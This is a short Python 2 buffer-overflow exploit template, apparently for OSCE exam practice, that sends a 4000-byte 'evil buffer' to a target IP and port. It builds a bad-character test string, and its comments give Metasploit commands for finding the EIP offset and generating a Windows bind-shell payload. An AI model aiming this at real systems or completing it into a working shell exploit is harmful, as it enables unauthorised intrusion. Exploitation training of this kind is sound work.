# -*- coding: utf-8 -*-
import socket
import argparse

arg = argparse.ArgumentParser(description='OSCE Exploit Template')
arg.add_argument("IP",help="Target IP")
arg.add_argument("port",help="Port number")
args = arg.parse_args()

# Determine EIP offset
# msf-pattern_create -l <num>
# msf-pattern_offset -l <num> -q <eip>

# Process badchars
badchar_test = "" # start with an empty string
badchars = [] # we've reasoned that these are bad

for i in range(0x00, 0xFF+1):
    if i not in badchars: # skip the badchars
        badchar_test += chr(i) # append each non-badchar char to the string

# Generate shellcode - Remember to add identified badchars
# msfvenom -p windows/shell_bind_tcp LPORT=<port> -f py

try:
    print "\nSending evil buffer..."
    buffer = "A" * 4000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.IP, int(args.port)))
    s.send(buffer)
    s.close()
except:
    print "Could not connect!"
    exit()